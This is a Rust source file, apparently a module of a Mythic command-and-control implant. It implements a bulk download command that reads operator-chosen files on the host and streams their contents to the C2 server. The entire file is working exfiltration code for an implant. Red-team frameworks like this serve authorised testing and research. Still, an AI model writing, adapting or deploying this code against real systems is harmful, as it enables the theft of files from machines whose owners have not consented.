use crate::structs::{SendFileToMythicStruct, Task};
use serde::Deserialize;
use tokio::sync::mpsc;

#[derive(Deserialize)]
struct DownloadBulkArgs {
    files: Vec<String>,
}

pub async fn execute(task: Task) {
    let mut response = task.new_response();

    let args: DownloadBulkArgs = match serde_json::from_str(&task.data.params) {
        Ok(a) => a,
        Err(e) => {
            response.set_error(&format!("Failed to parse parameters: {}", e));
            let _ = task.job.send_responses.send(response).await;
            let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
            return;
        }
    };

    let mut results = Vec::new();
    for file_path in &args.files {
        let path = std::path::Path::new(file_path);
        match tokio::fs::read(path).await {
            Ok(data) => {
                let filename = path
                    .file_name()
                    .map(|n| n.to_string_lossy().to_string())
                    .unwrap_or_else(|| file_path.clone());

                let (finished_tx, mut finished_rx) = mpsc::channel::<i32>(1);
                let send_msg = SendFileToMythicStruct {
                    task_id: task.data.task_id.clone(),
                    is_screenshot: false,
                    file_name: filename.clone(),
                    send_user_status_updates: false,
                    full_path: file_path.clone(),
                    data: Some(data),
                    finished_transfer: finished_tx,
                    tracking_uuid: String::new(),
                    send_responses: task.job.send_responses.clone(),
                    file_transfers: task.job.file_transfers.clone(),
                };

                if task.job.send_file_to_mythic.send(send_msg).await.is_ok() {
                    let _ = finished_rx.recv().await;
                    results.push(format!("OK: {}", file_path));
                } else {
                    results.push(format!("FAIL: {} (channel error)", file_path));
                }
            }
            Err(e) => results.push(format!("FAIL: {} ({})", file_path, e)),
        }
    }

    response.user_output = results.join("\n");
    response.completed = true;
    let _ = task.job.send_responses.send(response).await;
    let _ = task.remove_running_task.send(task.data.task_id.clone()).await;
}
